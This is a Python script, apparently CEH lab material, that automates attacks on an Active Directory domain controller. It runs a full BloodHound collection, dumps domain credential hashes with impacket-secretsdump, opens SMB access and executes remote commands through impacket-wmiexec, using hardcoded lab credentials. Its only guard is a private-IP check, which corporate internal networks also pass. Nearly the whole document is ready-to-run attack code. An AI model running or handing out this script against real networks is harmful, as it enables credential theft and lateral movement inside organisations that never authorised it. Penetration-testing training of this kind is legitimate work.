#!/usr/bin/env python3
# LAB-ONLY: Full Active Directory Enumeration (BloodHound + Impacket)
# CEH v13 Ultimate Offensive Script 03
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import sys
import subprocess

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "LAB.LOCAL"
LAB_DC_IP = "192.168.100.10"
LAB_USERNAME = "labuser"
LAB_PASSWORD = "labpass123!"
# -----------------------------------------------------------------------------------

def run_bloodhound():
    print("[*] Running BloodHound collection...")
    cmd = f"bloodhound-python -c all -u {LAB_USERNAME}@{LAB_DOMAIN} -p '{LAB_PASSWORD}' -d {LAB_DOMAIN} -dc {LAB_DC_IP}"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print(result.stdout)
    except Exception as e:
        print(f"Error: {e}")

def run_impacket_enum():
    print("\n[*] Running Impacket enumeration...")
    commands = [
        f"impacket-secretsdump {LAB_DOMAIN}/{LAB_USERNAME}:{LAB_PASSWORD}@{LAB_DC_IP}",
        f"impacket-smbclient {LAB_DOMAIN}/{LAB_USERNAME}:{LAB_PASSWORD}@{LAB_DC_IP}",
        f"impacket-wmiexec {LAB_DOMAIN}/{LAB_USERNAME}:{LAB_PASSWORD}@{LAB_DC_IP} 'whoami'"
    ]
    for cmd in commands:
        print(f"\n--- Executing: {cmd} ---")
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            print(result.stdout)
        except Exception as e:
            print(f"Error: {e}")

def main():
    print("="*80)
    print("LAB-ONLY: Full AD Enumeration")
    print("="*80)
    print(f"[*] Domain: {LAB_DOMAIN}")
    print("-"*80)
    run_bloodhound()
    run_impacket_enum()

if __name__ == "__main__":
    if not LAB_DC_IP.startswith(("10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.")):
        print("ERROR: LAB-ONLY! Use private lab DC IP!")
        sys.exit(1)
    main()
